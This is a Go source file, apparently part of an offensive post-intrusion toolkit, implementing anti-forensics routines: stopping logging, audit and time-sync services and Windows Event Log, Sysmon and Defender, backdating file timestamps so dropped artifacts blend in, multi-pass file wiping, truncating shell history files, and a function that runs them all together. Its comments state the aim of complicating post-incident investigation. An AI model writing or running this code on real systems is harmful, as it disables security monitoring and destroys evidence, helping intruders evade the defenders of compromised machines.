package recon2

import (
	"errors"
	"fmt"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"
)

// Anti-forensics primitives. Not a complete evidence-elimination kit —
// nothing on this list defeats remote SIEM forwarding, kernel-side audit
// trails, or external log aggregation that's already shipped the events.
// These are the local moves that buy time and complicate a lab-based
// post-mortem.
//
//   logShippingStop    stop rsyslog / syslog-ng / fluentd / filebeat / journald
//   timestampReset     touch files to a target mtime/atime
//   secureDelete       multi-pass overwrite before unlink
//   historyWipe        clear shell history files for the current user

// ForensicsOptions controls an anti-forensics run.
type ForensicsOptions struct {
	DryRun bool
}

// ForensicsResult is one action's outcome.
type ForensicsResult struct {
	Action   string `json:"action"`
	Target   string `json:"target,omitempty"`
	OK       bool   `json:"ok"`
	Detail   string `json:"detail,omitempty"`
	Err      string `json:"error,omitempty"`
}

// LogShippingStop stops common log-forwarding services. On Linux this
// kills systemd units; the changes are non-persistent (a reboot brings
// them back unless the operator also disables the units).
//
// On Windows, stops the Windows Event Log service temporarily and the
// Sysmon service if present.
func LogShippingStop(opts ForensicsOptions) []ForensicsResult {
	var out []ForensicsResult

	if runtime.GOOS == "linux" {
		units := []string{
			"rsyslog", "syslog-ng", "systemd-journald", "fluentd", "filebeat",
			"auditd", "chronyd", "systemd-timesyncd", "ntpd",
		}
		for _, u := range units {
			// check if the unit is active first
			if _, err := exec.Command("systemctl", "is-active", u).Output(); err != nil {
				// not active / not present
				continue
			}
			r := ForensicsResult{Action: "stop_service", Target: u}
			if opts.DryRun {
				r.OK = true
				r.Detail = "would stop " + u
				out = append(out, r)
				continue
			}
			cmd := exec.Command("systemctl", "stop", u)
			if b, err := cmd.CombinedOutput(); err != nil {
				r.Err = err.Error() + ": " + strings.TrimSpace(string(b))
			} else {
				r.OK = true
			}
			out = append(out, r)
		}
	} else if runtime.GOOS == "windows" {
		services := []string{"EventLog", "Sysmon", "Sysmon64", "WinDefend"}
		for _, s := range services {
			r := ForensicsResult{Action: "stop_service", Target: s}
			if opts.DryRun {
				r.OK = true
				r.Detail = "would stop " + s
				out = append(out, r)
				continue
			}
			cmd := exec.Command("sc", "stop", s)
			if b, err := cmd.CombinedOutput(); err != nil {
				r.Err = err.Error() + ": " + strings.TrimSpace(string(b))
			} else {
				r.OK = true
			}
			out = append(out, r)
		}
	}
	return out
}

// TimestampReset rewrites atime and mtime on the target file to the given
// time. Useful for making a dropped artifact blend in with its neighbours.
func TimestampReset(path string, when time.Time, opts ForensicsOptions) (ForensicsResult, error) {
	r := ForensicsResult{Action: "timestamp_reset", Target: path}
	if path == "" {
		return r, errors.New("recon2: path required")
	}
	if when.IsZero() {
		when = time.Now().Add(-30 * 24 * time.Hour)
	}
	if opts.DryRun {
		r.OK = true
		r.Detail = "would set atime/mtime to " + when.Format(time.RFC3339)
		return r, nil
	}
	if err := os.Chtimes(path, when, when); err != nil {
		r.Err = err.Error()
		return r, err
	}
	r.OK = true
	return r, nil
}

// SecureDelete overwrites a file with the given number of passes before
// unlinking it.
//
// The multi-pass erase is a holdover from magnetic media. On SSDs, flash
// translation layers, and any journaled filesystem, the original bytes
// usually survive somewhere on the raw device. The one true anti-forensics
// answer is full-disk encryption — the pass-wipe only raises the bar for
// trivial recovery.
func SecureDelete(path string, passes int, opts ForensicsOptions) (ForensicsResult, error) {
	r := ForensicsResult{Action: "secure_delete", Target: path}
	if path == "" {
		return r, errors.New("recon2: path required")
	}
	if passes <= 0 {
		passes = 3
	}
	info, err := os.Stat(path)
	if err != nil {
		r.Err = err.Error()
		return r, err
	}
	if info.IsDir() {
		r.Err = "refusing to secure-delete a directory"
		return r, errors.New(r.Err)
	}
	size := info.Size()
	if opts.DryRun {
		r.OK = true
		r.Detail = fmt.Sprintf("would overwrite %d bytes with %d passes then unlink", size, passes)
		return r, nil
	}
	f, err := os.OpenFile(path, os.O_WRONLY, 0)
	if err != nil {
		r.Err = err.Error()
		return r, err
	}
	buf := make([]byte, 64*1024)
	for pass := 0; pass < passes; pass++ {
		// alternate patterns: zeros, 0xFF, random
		var fill byte
		switch pass % 3 {
		case 0:
			fill = 0x00
		case 1:
			fill = 0xFF
		default:
			fill = 0xAA
		}
		for i := range buf {
			buf[i] = fill
		}
		if _, err := f.Seek(0, 0); err != nil {
			f.Close()
			r.Err = err.Error()
			return r, err
		}
		var written int64
		for written < size {
			n := int64(len(buf))
			if size-written < n {
				n = size - written
			}
			if _, err := f.Write(buf[:n]); err != nil {
				f.Close()
				r.Err = err.Error()
				return r, err
			}
			written += n
		}
		_ = f.Sync()
	}
	f.Close()
	if err := os.Remove(path); err != nil {
		r.Err = err.Error()
		return r, err
	}
	r.OK = true
	r.Detail = fmt.Sprintf("wiped %d bytes in %d passes then unlinked", size, passes)
	return r, nil
}

// HistoryWipe clears the current user's shell history files.
func HistoryWipe(opts ForensicsOptions) []ForensicsResult {
	var out []ForensicsResult
	home, err := os.UserHomeDir()
	if err != nil {
		return []ForensicsResult{{Action: "history_wipe", Err: err.Error()}}
	}
	files := []string{
		home + "/.bash_history",
		home + "/.zsh_history",
		home + "/.sh_history",
		home + "/.history",
		home + "/.python_history",
		home + "/.node_repl_history",
		home + "/.psql_history",
		home + "/.mysql_history",
		home + "/.config/fish/fish_history",
	}
	for _, f := range files {
		if _, err := os.Stat(f); err != nil {
			continue
		}
		r := ForensicsResult{Action: "history_wipe", Target: f}
		if opts.DryRun {
			r.OK = true
			r.Detail = "would truncate"
			out = append(out, r)
			continue
		}
		fd, err := os.OpenFile(f, os.O_WRONLY|os.O_TRUNC, 0)
		if err != nil {
			r.Err = err.Error()
		} else {
			fd.Close()
			r.OK = true
		}
		out = append(out, r)
	}
	return out
}

// All runs the standard anti-forensics pass — log shipping stop, history
// wipe, secure-delete of the given paths.
func All(paths []string, opts ForensicsOptions) []ForensicsResult {
	var out []ForensicsResult
	out = append(out, LogShippingStop(opts)...)
	out = append(out, HistoryWipe(opts)...)
	for _, p := range paths {
		if r, err := SecureDelete(p, 3, opts); err == nil || r.Err != "" {
			out = append(out, r)
		}
	}
	return out
}
